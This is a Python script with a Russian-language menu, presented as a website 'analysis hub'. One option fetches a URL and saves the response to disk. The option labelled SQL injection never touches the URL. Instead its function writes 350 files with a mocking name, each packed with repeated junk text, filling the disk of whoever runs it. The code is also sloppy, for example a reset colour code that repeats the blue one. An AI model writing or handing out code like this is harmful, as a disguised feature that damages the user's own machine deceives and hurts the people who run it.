import os
import requests as rq

#-----------------------elements------------------------

Enter = "-Нажмите Enter чтобы продолжить--}"
BLUE = "\033[1;34m"
RESET = "\033[1;34m"

bannr = f"""{BLUE}
╔═════════════════════════════════════════════════════════════════════╗
║                                                                     ║
║            M X Z Y   A N A L I S Y S   H U B                        ║
║                                                                     ║
╚═════════════════════════════════════════════════════════════════════╝
{RESET}"""

#-------------------helper functions--------------------

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
      clear()
      print(bannr)
      
def retry(x,y):
      clear()
      x(y)

def rec(num,dir, name, x):
      with open(f"{dir}{name}", "w",encoding="utf-8") as num:
            num.write(x)

#----------------Select-----------------

def Select(Dir):
      try:
            banner()
            print("----ФУНКЦИИ----")
            print("\n0. Базовый анализис сайтов\n1. SQL иньекции\n2. Выход")
            Select = input("\n\n-Выберите функцию:--")
            if Select == "0":
                  retry(urly,Dir)
            elif Select == "1":
                  retry(SQL,"url")
            elif Select == "2":
                  quit()
            else:
                  print("\n-Выберите один из вариантов!")
                  input(Enter)
                  retry(Select,Dir)
      except TypeError:
            print("-Вставте цифру выбранного варианта!")
            input(Enter)
            retry(Select,Dir)

#---------------analisys--------------

def urly(Dir):
      try:
            url = input("\n-Вставте ссылку для анализа:")
            if url == "":
                  retry(urly,Dir)
            GetRequest = rq.get(url)
            print(GetRequest)
            GetOptions = rq.options(url)
            print(GetOptions)
            print(f"доступные методы: {GetOptions.headers.get('Allow')} ")
            print("-----------------------------")
            rec(1,Dir,"url.txt",GetRequest.url)
            rec(2,Dir,"text.txt", GetRequest.text)
            rec(3,Dir,"siteoffl.html", GetRequest.text)
      except rq.exceptions.InvalidSchema:
            retry(urly,Dir)
      except rq.exceptions.MissingSchema:
            retry(urly,Dir)
      except rq.exceptions.InvalidURL:
            retry(urly,Dir)
      try:
            rec(4,Dir,"json.txt",GetRequest.json())
      except:
            rec(4,Dir,"json.txt","there is no json")
      input(Enter)
      retry(Directory,0)

#-------------------------directory-----------------------

def Directory(n):
      banner()
      try:
            dr = input("\n-Название папки которая будет созданна и куда будут направленны результаты анализа:\n\n---")
            dir = f"AnalisysRep/{dr}"
            if dr == "" :
                  print("-Вы не можете указать пустоту!")
                  retry(Directory,0)
            os.mkdir(dir)
            DirResult = os.path.exists(dir)
            Dir = f"{dir}/"
            print(DirResult)
      except TypeError:
            print("\n\n-Данное название не может быть использованно.")
            input(Enter)
            retry(Directory,0)
      Select(Dir)


#--------------------------SQL-injection-------------------------

def SQL(url):
      r = 350 
      o = 0
      for i in range(r):
            i = i + 1
            file = open(f"ya-pravda-gay{i}.gay", "w")
            o = o + 0.4 
            clear()
            print(int(o),"%")
            for e in range(100000):
                  e = e+1
                  file.write(str(int))

#-----------------------------Run-----------------------------

Directory(0)